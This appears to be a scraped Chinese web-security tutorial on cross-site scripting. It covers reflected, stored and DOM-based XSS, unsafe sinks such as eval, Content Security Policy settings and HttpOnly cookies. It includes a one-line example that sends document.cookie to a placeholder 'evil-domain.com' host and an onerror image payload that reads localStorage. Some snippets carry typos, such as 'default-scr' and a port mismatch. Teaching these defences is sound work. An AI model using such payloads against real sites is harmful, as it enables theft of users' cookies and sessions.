  <span class="hljs-comment">// setTimeout()/setInterval() 中调用恶意代码</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-string">&#x27;UNTRUSTED&#x27;</span>);
  <span class="hljs-built_in">setInterval</span>(<span class="hljs-string">&#x27;UNTRUSTED&#x27;</span>);

  <span class="hljs-comment">// location 调用恶意代码</span>
  location.<span class="hljs-property">href</span> = <span class="hljs-string">&#x27;UNTRUSTED&#x27;</span>;

  <span class="hljs-comment">// eval() 中调用恶意代码</span>
  <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;UNTRUSTED&#x27;</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p>
<h3>內容安全策略</h3>
<p><strong>内容安全策略</strong>（Content Security Policy，简称 CSP）是一种 <strong>可信白名单</strong> 作机制，来限制网站中是否可以包含某来源内容。该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
<p><strong>启用 CSP 方式</strong></p>
<ol>
<li>设置 HTTP 头信息的 Content-Security-Policy 字段</li>
</ol>
<pre class="hljs"><code class="language-http"><span class="hljs-attribute">content-security-policy</span><span class="hljs-punctuation">: </span>default-scr https:; connect-src https:; font-src https: data:; frame-src https: twitter:; img-src https: data:; media-src https:; object-src https:; script-src &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; https:; style-src &#x27;unsafe-inline&#x27; https:;
</code></pre>
<ol start="2">
<li>通过网页 <code>&lt;meta&gt;</code> 标签</li>
</ol>
<pre class="hljs"><code class="language-html"><span class="hljs-comment">&lt;!-- 一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名) --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;efault-src &#x27;self&#x27;&quot;</span> /&gt;</span>

<span class="hljs-comment">&lt;!-- 一个网站管理者允许内容来自信任的域名及其子域名 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27; *.trusted.com&quot;</span> /&gt;</span>

<span class="hljs-comment">&lt;!-- 一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者（获得），所有脚本必须从特定主机服务器获取可信的代码。 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span>
  <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span>
  <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com&quot;</span>
/&gt;</span>

<span class="hljs-comment">&lt;!-- 一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span>
  <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span>
  <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src https://onlinebanking.jumbobank.com&quot;</span>
/&gt;</span>

<span class="hljs-comment">&lt;!--  一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容（从任意位置加载）。 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27; *.mailsite.com; img-src *&quot;</span> /&gt;</span>
</code></pre>
<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
<p>严格的 CSP 在 XSS 的防范中可以起到下列的作用：</p>
<ul>
<li>禁止加载外域代码，防止复杂的攻击逻辑</li>
<li>禁止外域提交，网站被攻击后，用户的数据不会泄漏到外域</li>
<li>禁止内联脚本执行（规则较严格，目前发现 Github 使用）</li>
<li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）</li>
<li>合理使用上报可以及时发现 XSS，利于尽快修复问题</li>
</ul>
<blockquote>
<p>更多关于 CSP 的理解可以参考 <a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener noreferrer nofollow">Content Security Policy（CSP）是什么？为什么它能低于 XSS 攻击？</a></p>
<p>或者查看关于 <a href="/front-end/computer-networks/http/content-security-policy">HTTP CSP 内容安全策略</a> 的整理。</p>
</blockquote>
<h3>HTTPOnly Cookie</h3>
<p>窃取网页 Cookie 的示例：</p>
<pre class="hljs"><code class="language-js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>().<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;http://www.evil-domain.com/steal-cookie.php?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
</code></pre>
<p>使用 HttpOnly Cookie 将重要的 Cookie 标记为 <code>http-only</code>，这样的话当浏览器向 Web 服务器发起请求的时就会带上 Cookie 字段，但是在 JavaScript 脚本中却不能访问这个 Cookie，这样就避免了 XSS 攻击利用 JavaScript 的 <code>document.cookie</code> 获取 Cookie。</p>
<p>在 Koa 中设置 Cookie <code>httpOnly</code> 属性：</p>
<pre class="hljs"><code class="language-js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Koa</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>);
<span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Koa</span>();

app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">async</span> (ctx) =&gt; {
  <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">url</span> === <span class="hljs-string">&#x27;/index&#x27;</span>) {
    ctx.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;cid&#x27;</span>, <span class="hljs-string">&#x27;hello world&#x27;</span>, {
      <span class="hljs-comment">// 写 Cookie 所在域名</span>
      <span class="hljs-attr">domain</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,
      <span class="hljs-comment">// 写 Cookie 所在的路径</span>
      <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/index&#x27;</span>,
      <span class="hljs-comment">// Cookie 有效时长</span>
      <span class="hljs-attr">maxAge</span>: <span class="hljs-number">10</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
      <span class="hljs-comment">// Cookie 失效时间</span>
      <span class="hljs-attr">expires</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">&#x27;2017-02-15&#x27;</span>),
      <span class="hljs-comment">// 是否只用于 HTTP 请求中获取</span>
      <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-comment">// 是否允许重写</span>
      <span class="hljs-attr">overwrite</span>: <span class="hljs-literal">false</span>,
    });

    ctx.<span class="hljs-property">body</span> = <span class="hljs-string">&#x27;Cookie is ok.&#x27;</span>;
  } <span class="hljs-keyword">else</span> {
    ctx.<span class="hljs-property">body</span> = <span class="hljs-string">&#x27;Hello world!&#x27;</span>;
  }
});

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">300</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;[demo] Cookie is starting at port 3000&#x27;</span>);
});
</code></pre>
<p>在 Chrome 浏览器 Application 面板查看 Cookie 缓存可以直到哪些 Cookie 字段设置了 HttpOnly：</p>
<pre class="hljs"><code class="language-jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;
<span class="hljs-keyword">import</span> img <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../../assets/web-security/xss-cookies-httponly.jpg&#x27;</span>;

<span class="hljs-keyword">export</span> <span class="hljs-title function_">default</span> () =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Cookies HttpOnly&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{img}</span> <span class="hljs-attr">width</span>=<span class="hljs-string">{720}</span> /&gt;</span></span>;
</code></pre>
<h2>参考资料</h2>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener noreferrer nofollow">📖 MDN: 内容安全策略(CSP)</a></li>
<li><a href="https://www.bilibili.com/video/av56520828" target="_blank" rel="noopener noreferrer nofollow">📽 Web 安全之 XSS 攻击与防御</a></li>
<li><a href="https://juejin.im/post/6844903685122703367" target="_blank" rel="noopener noreferrer nofollow">📝 美团技术团队 前端安全系列：如何防止 XSS 攻击?</a></li>
<li><a href="https://yq.aliyun.com/articles/638829" target="_blank" rel="noopener noreferrer nofollow">📝 Web 安全系列：XSS 攻击基础及原理</a></li>
<li><a href="https://yq.aliyun.com/articles/638935?spm=a2c4e.11153940.blogcont638829.21.74d874d3lHE0qK" target="_blank" rel="noopener noreferrer nofollow">📝 Web 安全系列：XSS 攻击进阶</a></li>
<li><a href="https://yq.aliyun.com/articles/641535?spm=a2c4e.11153940.blogcont638935.16.6e757039SLyW6B" target="_blank" rel="noopener noreferrer nofollow">📝 Web 安全系列：XSS 攻击进阶</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener noreferrer nofollow">📝 阮一峰 Content Security Policy 入门教程</a></li>
<li><a href="https://www.cnblogs.com/Wayou/p/intro_to_content_security_policy.html" target="_blank" rel="noopener noreferrer nofollow">📝 Content Security Policy（CSP）介绍</a></li>
</ul>
</article></div></main><script src="/_next/static/chunks/webpack-038c2e688b596d0e.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[5244,[],\"\"]\n3:I[3866,[],\"\"]\n5:I[6213,[],\"OutletBoundary\"]\n7:I[6213,[],\"MetadataBoundary\"]\n9:I[6213,[],\"ViewportBoundary\"]\nb:I[4835,[],\"\"]\n:HL[\"/_next/static/media/569ce4b8f30dc480-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/93f479601ee12b01-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/ec0a9d078e716e00.css\",\"style\"]\n:HL[\"/_next/static/css/485ff6fe79292a08.css\",\"style\"]\n:HL[\"/_next/static/css/0ff121a467c0636f.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"ToCgoFiTXvECVEVLCeZww\",\"p\":\"\",\"c\":[\"\",\"front-end\",\"computer-networks\",\"web-security\",\"xss\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"front-end\",{\"children\":[[\"slug\",\"computer-networks/web-security/xss\",\"oc\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/ec0a9d078e716e00.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"__variable_4d318d __variable_ea5f4b antialiased\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[],[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}]]}],{\"children\":[\"front-end\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/485ff6fe79292a08.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/0ff121a467c0636f.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"main\",null,{\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"front-end\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}],{\"children\":[[\"slug\",\"computer-networks/web-security/xss\",\"oc\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"front-end\",\"children\",\"$0:f:0:1:2:children:2:children:0\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L4\",null,[\"$\",\"$L5\",null,{\"children\":\"$L6\"}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"0jPmsmhJRA9zClaEhQrbg\",{\"children\":[[\"$\",\"$L7\",null,{\"children\":\"$L8\"}],[\"$\",\"$L9\",null,{\"children\":\"$La\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$b\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"c:Ta4fa,"])</script><script>self.__next_f.push([1,"\u003ch1\u003eXSS 跨站脚本攻击\u003c/h1\u003e\n\u003cp\u003eXSS 攻击全称 \u003cstrong\u003e跨站脚本攻击\u003c/strong\u003e（Cross-Site Scripting），是一种代码注入攻击。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e攻击方法：攻击者利用网页开发时留下的漏洞，通过巧妙的方法在目标网站 HTML 页面中注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。\u003c/li\u003e\n\u003cli\u003e本质：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e攻击种类\u003c/h2\u003e\n\u003cp\u003e根据攻击的来源，XSS 攻击可分为 \u003cstrong\u003e反射型\u003c/strong\u003e、\u003cstrong\u003e存储型\u003c/strong\u003e 和 \u003cstrong\u003eDOM-Based 型\u003c/strong\u003e三种。\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth style=\"text-align:left\"\u003e类型\u003c/th\u003e\n\u003cth style=\"text-align:left\"\u003e存储区\u003c/th\u003e\n\u003cth style=\"text-align:left\"\u003e插入点\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003e反射型\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003eURL\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003eHTML\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003e存储型\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e服务端数据库\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003eHTML\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003eDOM-Based 型\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e服务端数据库 / 客户端存储 / URL\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e前端 JavaScript\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e名词说明：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e存储区\u003c/strong\u003e：恶意代码存放的位置\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e插入点\u003c/strong\u003e：由谁取得恶意代码，并插入到网页上\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003e反射型\u003c/h3\u003e\n\u003cp\u003e反射型 XSS 攻击又称为\u003cstrong\u003e非持久性跨站点脚本攻击\u003c/strong\u003e，这种攻击类型通过诱导用户点击恶意链接来造成一次性攻击。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e攻击方式\u003c/strong\u003e：漏洞产生的原因是攻击者 \u0026lt;strong style=\u0026quot;color:red\u0026quot;\u0026gt;注入的数据反映在请求响应\u0026lt;/strong\u0026gt; 中。用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。通过 URL 参数直接注入，然后在响应的数据中包含着危险的代码。\u003c/p\u003e\n\u003cp\u003e攻击步骤：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e攻击者把带有恶意脚本代码参数的 URL 地址发送给用户\u003c/li\u003e\n\u003cli\u003e用户点击此链接\u003c/li\u003e\n\u003cli\u003e服务器端获取请求参数并且直接使用，服务器反射回结果页面\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e说明：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e反射型 XSS 攻击是一次性的，必须要通过用户点击链接才能发起\u003c/li\u003e\n\u003cli\u003e一些浏览器如 Chrome 其内置了一些 XSS 过滤器，可以防止大部分反射型 XSS 攻击\u003c/li\u003e\n\u003cli\u003e反射型 XSS 其实就是服务器没有对恶意的用户输入进行安全处理就直接反射响应内容，导致恶意代码在浏览器中执行的一种 XSS 漏洞\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e攻击示例：\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;root\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;application/javascript\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"language-javascript\"\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 假设这是请求返回的数据\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e res = [\u003cspan class=\"hljs-string\"\u003e\u0026#x27;1\u0026#x27;\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;2\u0026#x27;\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;3\u0026#x27;\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026lt;img src=\u0026quot;1\u0026quot; onerror=\u0026quot;console.log(windwo.localStorage)\u0026quot; /\u0026gt;\u0026#x27;\u003c/span\u003e];\n\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e root = \u003cspan class=\"hljs-variable language_\"\u003edocument\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003equerySelector\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;#root\u0026#x27;\u003c/span\u003e);\n\n  res.\u003cspan class=\"hljs-title function_\"\u003eforEach\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eitem\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e p = \u003cspan class=\"hljs-variable language_\"\u003edocument\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003ecreateElement\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;p\u0026#x27;\u003c/span\u003e);\n    p.\u003cspan class=\"hljs-property\"\u003einnerHTML\u003c/span\u003e = item;\n    root.\u003cspan class=\"hljs-title function_\"\u003eappend\u003c/span\u003e(p);\n  });\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当数据返回后，\u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e 标签会注入 HTML DOM 文档中，又因为 \u003ccode\u003esrc\u003c/code\u003e 属性为无效的 URL 值，所以触发了 \u003ccode\u003eonerror\u003c/code\u003e 事件，从而执行了 \u003ccode\u003eonerror\u003c/code\u003e 定义的函数，这样便获取到了存储在客户端本地的 \u003ccode\u003elocalStorage\u003c/code\u003e 信息。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e🤼‍♂️ \u003cstrong\u003e反射型 XSS 跟存储型 XSS 的区别是？\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e反射型 XSS 漏洞常见于 \u0026lt;strong style=\u0026quot;color:red\u0026quot;\u0026gt;通过 URL 传递参数\u0026lt;/strong\u0026gt; 的功能，如网站搜索、跳转等。\u003c/li\u003e\n\u003cli\u003e存储型 XSS 的恶意代码 \u0026lt;strong style=\u0026quot;color:red\u0026quot;\u0026gt;存在数据库\u0026lt;/strong\u0026gt; 里，反射型 XSS 的恶意代码存在 URL 里。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003ePOST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。\u003c/p\u003e\n\u003ch3\u003e存储型\u003c/h3\u003e\n\u003cp\u003e存储型 XSS 攻击又称为\u003cstrong\u003e持久性跨站点脚本攻击\u003c/strong\u003e，通常攻击者将代码存储到漏洞服务器中，用户浏览相关页面发起攻击。\u003c/p\u003e\n\u003cp\u003e攻击步骤：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e攻击者将恶意脚本代码上传或存储到漏洞服务器\u003c/li\u003e\n\u003cli\u003e服务器把恶意脚本保存到服务器\u003c/li\u003e\n\u003cli\u003e当正常客户访问服务器时，服务器会读取恶意数据并且直接使用\u003c/li\u003e\n\u003cli\u003e服务器会返回含有恶意脚本的页面\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e实际案例：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e譬如发帖中发出包含恶意代码的内容，其他内容访问到该内容后，满足特定条件后条件即触发\u003c/li\u003e\n\u003cli\u003e需要后台不过滤信息，并且前端展示时也不过滤信息\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e注意\u003c/strong\u003e：这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。\u003c/p\u003e\n\u003cp\u003e修复：服务端一般不会轻易对大量已存数据再编辑。需要对新写入数据修正存储逻辑。前端做好正确的 \u003cstrong\u003e编码转义\u003c/strong\u003e。\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth style=\"text-align:left\"\u003e类型\u003c/th\u003e\n\u003cth style=\"text-align:left\"\u003e反射型\u003c/th\u003e\n\u003cth style=\"text-align:left\"\u003e存储型\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003e持久性\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e非持久\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e持久化（存储在服务器）\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003e触发时机\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e需要用户点击\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e不需要用户交互也可以触发\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003e危害\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e危害较小\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e危害更大\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3\u003eDOM Based 型\u003c/h3\u003e\n\u003cp\u003eDOM Based 型 XSS，这种攻击类型不需要服务器端支持，是由于 DOM 结构修改导致的，基于浏览器 DOM 解析的攻击\u003c/p\u003e\n\u003cp\u003e攻击步骤：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e用户打开带有恶意的链接\u003c/li\u003e\n\u003cli\u003e浏览器在 DOM 解析的时候直接使用恶意数据\u003c/li\u003e\n\u003cli\u003e用户中招\u003c/li\u003e\n\u003cli\u003e常见的触发场景就是在修改 \u003ccode\u003einnerHTML\u003c/code\u003e、\u003ccode\u003eouterHTML\u003c/code\u003e、\u003ccode\u003edocument.write\u003c/code\u003e 的时候\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e实际案例：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e譬如 Wifi 浏览器劫持、DNS 劫持，并直接返回钓鱼页面\u003c/li\u003e\n\u003cli\u003e本质是需要更改 DOM，再排除自己攻击自己，所以这里单独拿流量劫持举例。严格来说某些反射型的攻击也能造成这个后果-通过 URL 控制 DOM。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eDOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。\u003c/p\u003e\n\u003ch2\u003e攻击手段\u003c/h2\u003e\n\u003cp\u003e攻击手段：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e获取页面的数据，如 DOM、Cookie、LocalStorage\u003c/li\u003e\n\u003cli\u003e破坏页面结构\u003c/li\u003e\n\u003cli\u003e流量劫持\u003c/li\u003e\n\u003cli\u003e挂马\u003c/li\u003e\n\u003cli\u003e盗取用户 Cookie\u003c/li\u003e\n\u003cli\u003eDDOS（拒绝服务）客户端浏览器\u003c/li\u003e\n\u003cli\u003e钓鱼工具，高级的钓鱼技巧\u003c/li\u003e\n\u003cli\u003e删除用户文章、恶意篡改数据、嫁祸\u003c/li\u003e\n\u003cli\u003e劫持用户 Web 行为，甚至进一步渗透内网\u003c/li\u003e\n\u003cli\u003e爆发 Web2.0 蠕虫\u003c/li\u003e\n\u003cli\u003e蠕虫式 DDoS 